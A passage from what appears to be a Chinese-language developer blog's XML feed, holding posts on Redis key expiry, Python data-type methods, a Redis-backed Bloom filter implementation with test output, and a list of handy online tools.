      <url>/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-expire%E6%AF%94exists%E6%9B%B4%E5%A5%BD%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/9352d20fb2e0">参考文章——简书</a></p><h4 id="什么情况下expire比exists更好？"><a href="#什么情况下expire比exists更好？" class="headerlink" title="什么情况下expire比exists更好？"></a>什么情况下expire比exists更好？</h4><h6 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h6><ul><li>redis key过期时间必须设置（特殊需求除外），但是如果DB的值有变动会主动更新到redis，所以不会有数据不同步的情况。</li></ul><h6 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h6><ul><li>每次都需要判断某个key是否存在，然后才能执行相应的操作。</li></ul><h6 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h6><ul><li>最坏情况下，代码在执行exists时key是有效的，后面对key进行操作时，发现在那两行代码执行的中间，key被清掉了。</li><li>条件虽然比较极端，但是在代码里——一切皆有可能。</li></ul><h6 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h6><ul><li>expire代替exists，重置key的过期时间。相当于利用expire给key续命，可以合理的“长生不死”。</li></ul><h1 id="过期相关补充"><a href="#过期相关补充" class="headerlink" title="过期相关补充"></a>过期相关补充</h1><h4 id="设置过期时间"><a href="#设置过期时间" class="headerlink" title="设置过期时间"></a>设置过期时间</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXPIRE &lt;KEY&gt; &lt;TTL&gt; : 将键的生存时间设为 ttl 秒</span><br><span class="line">PEXPIRE &lt;KEY&gt; &lt;TTL&gt; :将键的生存时间设为 ttl 毫秒</span><br><span class="line">EXPIREAT &lt;KEY&gt; &lt;timestamp&gt; :将键的过期时间设为 timestamp 所指定的秒数时间戳</span><br><span class="line">PEXPIREAT &lt;KEY&gt; &lt;timestamp&gt;: 将键的过期时间设为 timestamp 所指定的毫秒数时间戳.</span><br></pre></td></tr></tbody></table></figure><h4 id="移除过期时间"><a href="#移除过期时间" class="headerlink" title="移除过期时间"></a>移除过期时间</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">persist key</span><br></pre></td></tr></tbody></table></figure><h4 id="redis值和过期时间的存储"><a href="#redis值和过期时间的存储" class="headerlink" title="redis值和过期时间的存储"></a>redis值和过期时间的存储</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy83MzYxMzgzLTcwMDYyYTM2ZDQxOWZjMTcucG5n?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><h4 id="删除book键的过期时间后的存储结构"><a href="#删除book键的过期时间后的存储结构" class="headerlink" title="删除book键的过期时间后的存储结构"></a>删除book键的过期时间后的存储结构</h4><ul><li>book键的过期时间没有了<br><img src="https://img-blog.csdnimg.cn/20190823213116792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-基础知识整理</title>
      <link href="/uncatesgorized/2021-03-07-Python-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
      <url>/uncatesgorized/2021-03-07-Python-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>基本数据类型：int,float,str,list,dict,tuple,set,bool<br>数值类型：int,float,bool<br>序列类型：str,list,tuple<br>散列类型：set,dict</p><p>字节类型 a=bytes(‘123’)/a = b’123’<br>字节数组 bytearray(‘123’)</p><p>可变序列：list,set,dict<br>不可变序列：str,tuple</p><h4 id="数据类型方法"><a href="#数据类型方法" class="headerlink" title="数据类型方法"></a>数据类型方法</h4><h5 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h5><ol><li>增<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strs = str1 + str2 + str3</span><br><span class="line">strs = <span class="string">""</span>.join([str1, str2, str3])</span><br><span class="line">strs = <span class="string">"%s%s%s"</span> % (str1, str2, str3)</span><br><span class="line">strs = <span class="string">"{}{}{}"</span>.<span class="built_in">format</span>(str1, str2, str3)</span><br></pre></td></tr></tbody></table></figure></li><li>删<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># m准备替换的内容，n替换的内容，x替换的个数</span></span><br><span class="line">strs = x.replace(m, n, x)</span><br></pre></td></tr></tbody></table></figure></li><li>改<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x.upper() <span class="comment"># x转化为大写</span></span><br><span class="line">x.lower() <span class="comment"># x转化为小写</span></span><br><span class="line">x.strip() <span class="comment"># 去x左右空白</span></span><br><span class="line">x.lstrip() <span class="comment"># 去左空白</span></span><br><span class="line">x.rstrip() <span class="comment"># 去右空白</span></span><br><span class="line">x.title() <span class="comment"># x标题化</span></span><br><span class="line">x.capitalize() <span class="comment"># 第一个字母大写</span></span><br><span class="line">x.split(m, x) <span class="comment"># 以m为界分割，分割x次</span></span><br></pre></td></tr></tbody></table></figure></li><li>查<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x.index(m) <span class="comment"># m的索引 找不到抛异常</span></span><br><span class="line">x.find(m) <span class="comment"># m的索引 找不到返-1</span></span><br><span class="line">x.count(m) <span class="comment"># 计数</span></span><br><span class="line">x.isdigit(m) <span class="comment"># 是否是数字</span></span><br><span class="line">x.isalpha() <span class="comment"># 是否是字母</span></span><br><span class="line">x.isupper() <span class="comment"># 是否是大写</span></span><br><span class="line">x.islower() <span class="comment"># 是否是小写</span></span><br><span class="line">x.startswith(m) <span class="comment"># 是否以m开头</span></span><br><span class="line">x.endswith(m) <span class="comment"># 是否以m结尾</span></span><br></pre></td></tr></tbody></table></figure></li></ol><h5 id="列表方法"><a href="#列表方法" class="headerlink" title="列表方法"></a>列表方法</h5><ol><li>增<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">li.append(m)</span><br><span class="line">li.insert(x, m) <span class="comment"># 在x下标处插入m</span></span><br><span class="line">li.extend(<span class="built_in">list</span>)</span><br></pre></td></tr></tbody></table></figure></li><li>删<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">li.pop(x) <span class="comment"># 删除并返回该元素的值，若无参数则从最后开始删</span></span><br><span class="line">li.remove(m) <span class="comment"># 删掉第一个m</span></span><br><span class="line">li.clear() <span class="comment"># 清空 py2无此方法</span></span><br></pre></td></tr></tbody></table></figure></li><li>改<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">li[n] = x</span><br></pre></td></tr></tbody></table></figure></li><li>查 <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">li.index(m) <span class="comment"># m索引的内容</span></span><br><span class="line">li.count(m) <span class="comment"># m的数量</span></span><br></pre></td></tr></tbody></table></figure></li><li>浅复制<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy()</span><br></pre></td></tr></tbody></table></figure></li><li>深复制<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">li2 = copy.deepcopy(li1)</span><br></pre></td></tr></tbody></table></figure></li><li>永久排序<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">li.sort(reverse=<span class="literal">True</span>/<span class="literal">False</span>)</span><br><span class="line">li.reverse() <span class="comment"># 倒排序</span></span><br></pre></td></tr></tbody></table></figure></li><li>临时排序<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">li2 = <span class="built_in">sorted</span>(li, reverse=<span class="literal">True</span>/<span class="literal">False</span>) <span class="comment"># li2是list</span></span><br><span class="line">li2 = <span class="built_in">reversed</span>(li) <span class="comment"># li2是listreverseiterator 对象</span></span><br></pre></td></tr></tbody></table></figure></li></ol><h5 id="元组方法"><a href="#元组方法" class="headerlink" title="元组方法"></a>元组方法</h5><ol><li>查<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t.index(m)</span><br><span class="line">t.count(m)</span><br></pre></td></tr></tbody></table></figure></li></ol><h5 id="集合方法"><a href="#集合方法" class="headerlink" title="集合方法"></a>集合方法</h5><p><strong>交集&amp;</strong><br><strong>并集|</strong><br><strong>差集-</strong></p><ol><li>增<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.add(m)</span><br></pre></td></tr></tbody></table></figure></li><li>删<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.pop() <span class="comment"># 随机删除</span></span><br><span class="line">a.remove(m)</span><br></pre></td></tr></tbody></table></figure></li><li>改<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.update(m) <span class="comment"># 向集合添加m，m可以为str list tuple set dict</span></span><br></pre></td></tr></tbody></table></figure></li><li>查<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a.isdisjoint(b) <span class="comment"># 是否存在交集 </span></span><br><span class="line">a.issubset(b) <span class="comment"># a是否是b的子集</span></span><br><span class="line">a.issuperset(b) <span class="comment"># a是否是b的父集</span></span><br></pre></td></tr></tbody></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-BloomFilter实现</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-BloomFilter%E5%AE%9E%E7%8E%B0/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-BloomFilter%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<ul><li>学习笔记，如有不足之处，欢迎指正。</li></ul><h4 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleHash</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, cap, seed</span>):</span><br><span class="line">        self.cap = cap</span><br><span class="line">        self.seed = seed</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">self, value</span>):</span><br><span class="line">        ret = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(value)):</span><br><span class="line">            ret += self.seed * ret + <span class="built_in">ord</span>(value[i])</span><br><span class="line">        <span class="keyword">return</span> (self.cap - <span class="number">1</span>) &amp; ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BloomFilter</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="comment"># 随机种子</span></span><br><span class="line">    SEEDS = [<span class="number">543</span>, <span class="number">460</span>, <span class="number">171</span>, <span class="number">876</span>, <span class="number">796</span>, <span class="number">607</span>, <span class="number">650</span>, <span class="number">81</span>, <span class="number">837</span>, <span class="number">545</span>, <span class="number">591</span>, <span class="number">946</span>, <span class="number">846</span>, <span class="number">521</span>, <span class="number">913</span>, <span class="number">636</span>, <span class="number">878</span>, <span class="number">735</span>, <span class="number">414</span>, <span class="number">372</span>,</span><br><span class="line">             <span class="number">344</span>, <span class="number">324</span>, <span class="number">223</span>, <span class="number">180</span>, <span class="number">327</span>, <span class="number">891</span>, <span class="number">798</span>, <span class="number">933</span>, <span class="number">493</span>, <span class="number">293</span>, <span class="number">836</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">544</span>, <span class="number">924</span>, <span class="number">849</span>, <span class="number">438</span>, <span class="number">41</span>, <span class="number">862</span>, <span class="number">648</span>, <span class="number">338</span>,</span><br><span class="line">             <span class="number">465</span>, <span class="number">562</span>, <span class="number">693</span>, <span class="number">979</span>, <span class="number">52</span>, <span class="number">763</span>, <span class="number">103</span>, <span class="number">387</span>, <span class="number">374</span>, <span class="number">349</span>, <span class="number">94</span>, <span class="number">384</span>, <span class="number">680</span>, <span class="number">574</span>, <span class="number">480</span>, <span class="number">307</span>, <span class="number">580</span>, <span class="number">71</span>, <span class="number">535</span>, <span class="number">300</span>, <span class="number">53</span>,</span><br><span class="line">             <span class="number">481</span>, <span class="number">519</span>, <span class="number">644</span>, <span class="number">219</span>, <span class="number">686</span>, <span class="number">236</span>, <span class="number">424</span>, <span class="number">326</span>, <span class="number">244</span>, <span class="number">212</span>, <span class="number">909</span>, <span class="number">202</span>, <span class="number">951</span>, <span class="number">56</span>, <span class="number">812</span>, <span class="number">901</span>, <span class="number">926</span>, <span class="number">250</span>, <span class="number">507</span>, <span class="number">739</span>, <span class="number">371</span>,</span><br><span class="line">             <span class="number">63</span>, <span class="number">584</span>, <span class="number">154</span>, <span class="number">7</span>, <span class="number">284</span>, <span class="number">617</span>, <span class="number">332</span>, <span class="number">472</span>, <span class="number">140</span>, <span class="number">605</span>, <span class="number">262</span>, <span class="number">355</span>, <span class="number">526</span>, <span class="number">647</span>, <span class="number">923</span>, <span class="number">199</span>, <span class="number">518</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, capacity=<span class="number">100000000</span>, error_rate=<span class="number">0.0000001</span>, redis_con=<span class="literal">None</span>, key=<span class="string">"bloomfilter"</span></span>):</span><br><span class="line">        self.bit_size = math.ceil(capacity * math.log2(math.e) * math.log2(<span class="number">1</span> / error_rate))  <span class="comment"># 所需位数</span></span><br><span class="line">        self.hash_time = math.ceil(math.log1p(<span class="number">2</span>) * self.bit_size / capacity)  <span class="comment"># 最少hash次数</span></span><br><span class="line">        self.memery = math.ceil(self.bit_size / <span class="number">8</span> / <span class="number">1024</span> / <span class="number">1024</span>)  <span class="comment"># 占用多少M内存</span></span><br><span class="line">        self.block_num = math.ceil(self.memery / <span class="number">512</span>)  <span class="comment"># 需要多少个512M的内存块,value的第一个字符必须是ascii码，最多有256个内存块</span></span><br><span class="line">        self.seeds = self.SEEDS[<span class="number">0</span>:self.hash_time]</span><br><span class="line">        self.key = key</span><br><span class="line">        self.N = <span class="number">2</span> ** <span class="number">31</span> - <span class="number">1</span></span><br><span class="line">        self.hash_func = [SimpleHash(self.bit_size, seed) <span class="keyword">for</span> seed <span class="keyword">in</span> self.seeds]</span><br><span class="line">        self.redis_con = redis_con</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">return</span> self.key + <span class="built_in">str</span>(<span class="built_in">int</span>(value[<span class="number">0</span>:<span class="number">2</span>], <span class="number">16</span>) % self.block_num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_contains</span>(<span class="params">self, str_input</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> str_input:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            m5 = md5()</span><br><span class="line">            m5.update(str_input)</span><br><span class="line">            str_input = m5.hexdigest()</span><br><span class="line">            ret = <span class="literal">True</span></span><br><span class="line">            name = self.get_key(str_input)</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> self.hash_func:</span><br><span class="line">                loc = f.<span class="built_in">hash</span>(str_input)</span><br><span class="line">                ret = ret &amp; self.redis_con.getbit(name, loc)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">self, str_input</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            m5 = md5()</span><br><span class="line">            m5.update(str_input)</span><br><span class="line">            str_input = m5.hexdigest()</span><br><span class="line">            name = self.get_key(str_input)</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> self.hash_func:</span><br><span class="line">                loc = f.<span class="built_in">hash</span>(str_input)</span><br><span class="line">                self.redis_con.setbit(name, loc, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> </span><br></pre></td></tr></tbody></table></figure><h4 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    bloom_filter_redis_conn_args = {</span><br><span class="line">        <span class="string">"host"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">        <span class="string">"port"</span>: <span class="string">"6379"</span>,</span><br><span class="line">        <span class="string">"db"</span>: <span class="number">0</span></span><br><span class="line">    }</span><br><span class="line">    redis_con = redis.StrictRedis(connection_pool=redis.ConnectionPool(**bloom_filter_redis_conn_args))</span><br><span class="line">    bloom_filter = BloomFilter(redis_con=redis_con)</span><br><span class="line">    </span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6100000</span>, <span class="number">6101000</span>):</span><br><span class="line">        bloom_filter.insert(<span class="built_in">str</span>(i).encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="built_in">print</span>(time.time() - start_time)</span><br><span class="line">    <span class="built_in">print</span>(bloom_filter.is_contains(<span class="string">"6100101"</span>.encode(<span class="string">"utf-8"</span>)))</span><br></pre></td></tr></tbody></table></figure><h4 id="初步结论（本地测试）"><a href="#初步结论（本地测试）" class="headerlink" title="初步结论（本地测试）"></a>初步结论（本地测试）</h4><ul><li>插入1000条耗时在2-4s之间。</li><li>插入和查询耗时基本相同。</li></ul><h4 id="Redis数据查询"><a href="#Redis数据查询" class="headerlink" title="Redis数据查询"></a>Redis数据查询</h4><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ redis<span class="literal">-cli</span> <span class="literal">--bigkeys</span> <span class="literal">-i</span> <span class="number">0.1</span> <span class="literal">-h</span> <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Scanning the entire keyspace to find biggest keys as well as</span></span><br><span class="line"><span class="comment"># average sizes per key type.  You can use -i 0.1 to sleep 0.1 sec</span></span><br><span class="line"><span class="comment"># per 100 SCAN commands (not usually needed).</span></span><br><span class="line"></span><br><span class="line">[<span class="number">00.00</span>%] Biggest string found so far <span class="string">'bloomfilter0'</span> with <span class="number">419346305</span> bytes</span><br><span class="line"></span><br><span class="line"><span class="literal">--------</span> summary <span class="literal">-------</span></span><br><span class="line"></span><br><span class="line">Sampled <span class="number">1</span> keys <span class="keyword">in</span> the keyspace!</span><br><span class="line">Total key length <span class="keyword">in</span> bytes is <span class="number">12</span> (avg len <span class="number">12.00</span>)</span><br><span class="line"></span><br><span class="line">Biggest string found <span class="string">'bloomfilter0'</span> has <span class="number">419346305</span> bytes</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> strings with <span class="number">419346305</span> bytes (<span class="number">100.00</span>% of keys, avg size <span class="number">419346305.00</span>)</span><br><span class="line"><span class="number">0</span> lists with <span class="number">0</span> items (<span class="number">00.00</span>% of keys, avg size <span class="number">0.00</span>)</span><br><span class="line"><span class="number">0</span> hashs with <span class="number">0</span> fields (<span class="number">00.00</span>% of keys, avg size <span class="number">0.00</span>)</span><br><span class="line"><span class="number">0</span> streams with <span class="number">0</span> entries (<span class="number">00.00</span>% of keys, avg size <span class="number">0.00</span>)</span><br><span class="line"><span class="number">0</span> sets with <span class="number">0</span> members (<span class="number">00.00</span>% of keys, avg size <span class="number">0.00</span>)</span><br><span class="line"><span class="number">0</span> zsets with <span class="number">0</span> members (<span class="number">00.00</span>% of keys, avg size <span class="number">0.00</span>)</span><br></pre></td></tr></tbody></table></figure><p>可以看到 bloomfilter0 所占内存为400M左右</p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用在线网站</title>
      <link href="/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-%E6%9D%82-%E5%B8%B8%E7%94%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99/"/>
      <url>/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-%E6%9D%82-%E5%B8%B8%E7%94%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>欢迎补充</p><h4 id="curl-命令转换"><a href="#curl-命令转换" class="headerlink" title="curl 命令转换"></a>curl 命令转换</h4><p><a href="https://curl.trillworks.com/">https://curl.trillworks.com/</a></p><h4 id="curl-to-Go"><a href="#curl-to-Go" class="headerlink" title="curl-to-Go"></a>curl-to-Go</h4><p><a href="https://mholt.github.io/curl-to-go/">https://mholt.github.io/curl-to-go/</a></p><h4 id="JSON-to-Go"><a href="#JSON-to-Go" class="headerlink" title="JSON-to-Go"></a>JSON-to-Go</h4><p><a href="https://mholt.github.io/json-to-go/">https://mholt.github.io/json-to-go/</a></p><h4 id="mysql-转-ES-工具"><a href="#mysql-转-ES-工具" class="headerlink" title="mysql 转 ES 工具"></a>mysql 转 ES 工具</h4><p><a href="http://www.ischoolbar.com/EsParser/">http://www.ischoolbar.com/EsParser/</a></p><h4 id="json格式化、压缩、转义"><a href="#json格式化、压缩、转义" class="headerlink" title="json格式化、压缩、转义"></a>json格式化、压缩、转义</h4><p><a href="http://www.bejson.com/">http://www.bejson.com/</a></p><h4 id="代码对比"><a href="#代码对比" class="headerlink" title="代码对比"></a>代码对比</h4><p><a href="https://tool.oschina.net/diff">https://tool.oschina.net/diff</a></p><h4 id="corntab"><a href="#corntab" class="headerlink" title="corntab"></a>corntab</h4><p><a href="https://tool.lu/crontab/">https://tool.lu/crontab/</a></p><h4 id="时间戳转换"><a href="#时间戳转换" class="headerlink" title="时间戳转换"></a>时间戳转换</h4><p><a href="https://unixtime.51240.com/">https://unixtime.51240.com/</a></p><h4 id="URL编解码"><a href="#URL编解码" class="headerlink" title="URL编解码"></a>URL编解码</h4><p><a href="http://www.jsons.cn/urlencode/">http://www.jsons.cn/urlencode/</a></p><h4 id="中文字符与Unicode字符相互转换"><a href="#中文字符与Unicode字符相互转换" class="headerlink" title="中文字符与Unicode字符相互转换"></a>中文字符与Unicode字符相互转换</h4><p><a href="https://javawind.net/tools/native2ascii.jsp?action=transform">https://javawind.net/tools/native2ascii.jsp?action=transform</a></p><h4 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h4><p><a href="https://cloudconvert.com/extract-7z-archive">https://cloudconvert.com/extract-7z-archive</a></p><h4 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h4><p><a href="https://app.diagrams.net/">https://app.diagrams.net/</a></p><h4 id="Golang程序员开发效率神器汇总"><a href="#Golang程序员开发效率神器汇总" class="headerlink" title="Golang程序员开发效率神器汇总"></a>Golang程序员开发效率神器汇总</h4><p><a href="https://juejin.cn/post/6844904007169736718">https://juejin.cn/post/6844904007169736718</a></p><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><h4 id="加载等待CSS、GIF图"><a href="#加载等待CSS、GIF图" class="headerlink" title="加载等待CSS、GIF图"></a>加载等待CSS、GIF图</h4><p><a href="https://preloaders.net/">https://preloaders.net/</a><br><a href="https://loading.io/">https://loading.io/</a></p><h4 id="CSS代码兼容补全"><a href="#CSS代码兼容补全" class="headerlink" title="CSS代码兼容补全"></a>CSS代码兼容补全</h4><p><a href="http://autoprefixer.github.io/">http://autoprefixer.github.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> 效率工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三行代码发钉钉机器人消息</title>
      <link href="/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-Golang-%E4%B8%89%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%8F%91%E9%80%81%E9%92%89%E9%92%89%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%B6%88%E6%81%AF/"/>
      <url>/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-Golang-%E4%B8%89%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%8F%91%E9%80%81%E9%92%89%E9%92%89%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%B6%88%E6%81%AF/</url>
      
